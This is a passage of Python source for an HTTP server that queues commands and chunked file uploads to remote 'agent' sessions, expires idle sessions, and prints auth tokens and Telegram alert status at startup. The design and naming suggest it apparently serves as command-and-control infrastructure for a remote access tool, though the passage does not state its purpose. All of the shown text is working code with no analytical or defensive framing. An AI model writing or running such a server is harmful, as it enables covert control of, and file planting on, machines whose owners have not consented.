            if p == "/api/cmd":
                try:
                    j = json.loads(self.body() or b"{}")
                except Exception:
                    return self.snd(400, "json")
                sid = j.get("sid")
                with LOCK:
                    if sid not in S:
                        return self.snd(404, "no sess")
                    S[sid]["q"].append(to_agent(j.get("cmd", "")))
                    S[sid]["last"] = time.time()
                return self.snd(200, "ok")

            if p == "/api/put":
                sid = self.headers.get("X-Sid")
                name = os.path.basename(self.headers.get("X-Name") or "f.bin")
                data = self.body()
                with LOCK:
                    if sid not in S:
                        return self.snd(404, "no sess")
                    fid = secrets.token_hex(4)
                    rid = secrets.token_hex(4)
                    q = S[sid]["q"]
                    q.append({"t": "put_begin", "id": rid, "fid": fid, "name": name})
                    for i in range(0, len(data), 512 * 1024):
                        q.append({"t": "put_chunk", "id": rid, "fid": fid,
                                  "d": base64.b64encode(data[i:i + 512 * 1024]).decode()})
                    q.append({"t": "put_end", "id": rid, "fid": fid})
                return self.snd(200, "queued")

            return self.snd(404, "?")

        return self.snd(404, "?")


def gc():
    while True:
        time.sleep(120)
        cut = time.time() - SESSION_TTL
        with LOCK:
            for k in [k for k, v in S.items() if v["last"] < cut]:
                S.pop(k, None)


if __name__ == "__main__":
    _save_state()
    threading.Thread(target=gc, daemon=True).start()
    print("AUTH=%s\nTOKEN=%s\nTG=%s\nBASE=%s\nlistening :%d"
          % (AUTH, TOKEN, "on" if (TG_TOKEN and TG_CHAT) else "off", BASE, PORT), flush=True)
    ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
